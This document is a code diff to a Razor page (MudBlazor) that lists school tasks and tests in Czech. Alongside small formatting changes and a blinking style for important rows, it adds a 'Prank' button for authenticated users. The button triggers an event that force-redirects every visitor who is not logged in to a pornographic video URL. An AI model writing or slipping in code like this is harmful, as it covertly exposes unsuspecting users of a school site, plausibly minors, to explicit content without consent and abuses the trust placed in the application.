@@ -15,6 +15,9 @@
 <MudContainer MaxWidth="MaxWidth.Large" Class="mt-4">
     <MudPaper Elevation="4" Class="p-4">
         <MudText Typo="Typo.h4" GutterBottom="true" Align="Align.Center">Úkoly a testy</MudText>
+        <AuthorizeView>
+            <MudButton OnClick="InvokePrankAdmin">Prank</MudButton>
+        </AuthorizeView>
         <MudStack Row Wrap="Wrap.Wrap" AlignItems="AlignItems.Center">
             <MudSpacer />
             <div>
@@ -28,11 +31,11 @@
 
             </div>
             <MudTooltip Text="Zobrazit historii">
-                <MudIconButton Icon="@Icons.Material.Filled.History" OnClick="ShowHistory" Color="@(ShowHistoryActive ? Color.Info : Color.Default)"></MudIconButton>
+                <MudIconButton Icon="@Icons.Material.Filled.History" OnClick="ShowHistory" Color="@(ShowHistoryActive? Color.Info: Color.Default)"></MudIconButton>
             </MudTooltip>
         </MudStack>
 
-        <MudTable Loading="Loading" Items="SchoolTasks" Hover="true" Bordered="true">
+        <MudTable Loading="Loading" Items="SchoolTasks" Hover="true" Bordered="true" RowClassFunc="@((context, e) => context.Important ? "important-blink" : null)">
             <HeaderContent>
                 <MudTh>Předmět</MudTh>
                 <MudTh>Typ</MudTh>
@@ -55,9 +58,9 @@
                         }
 
                         <MudTooltip Text="@(Done ? "Hotovo" : "Brzy")">
-                            <MudIcon Icon="@(Done ? Icons.Material.Filled.Done : Icons.Material.Filled.Warning)"
-                            Color="@(Done ? Color.Success : Color.Error)"
-                            Style="margin-left: 5px; vertical-align: middle;" />
+                            <MudIcon Icon="@(Done? Icons.Material.Filled.Done : Icons.Material.Filled.Warning)"
+                                     Color="@(Done ? Color.Success : Color.Error)"
+                                     Style="margin-left: 5px; vertical-align: middle;" />
                         </MudTooltip>
                     }
                 </MudTd>
@@ -98,17 +101,24 @@
     </MudPaper>
 </MudContainer>
 
+
 @code {
     private IEnumerable<SchoolTask> SchoolTasks { get; set; } = [];
     private bool IsLogin { get; set; } = false;
     private DateTime? DateFilter { get; set; }
     private bool Loading { get; set; } = false;
 
+    private async Task InvokePrankAdmin()
+    {
+        await Refresh.CallPrank();
+    }
+
     protected override async Task OnInitializedAsync()
     {
         Loading = true;
         await Init();
         Refresh.OnChange += RefreshView;
+        Refresh.OnPrank += InvokePrank;
         var authState = await _authenticationStateProvider.GetAuthenticationStateAsync();
         IsLogin = authState.User.Identity?.IsAuthenticated ?? false;
         Loading = false;
@@ -125,6 +135,16 @@
         await Init();
         await InvokeAsync(StateHasChanged);
         snackbar.Add("Data byla úspěšně obnovena", Severity.Info);
+    }
+
+    private async Task InvokePrank()
+    {
+        if (IsLogin) {
+            snackbar.Add("Prank vyvolán!", Severity.Warning);
+            return;
+        }
+        nav.NavigateTo("https://cz.pornhub.com/view_video.php?viewkey=691ea2dd8428f");
+        return;
     }
 
     private async Task Init()
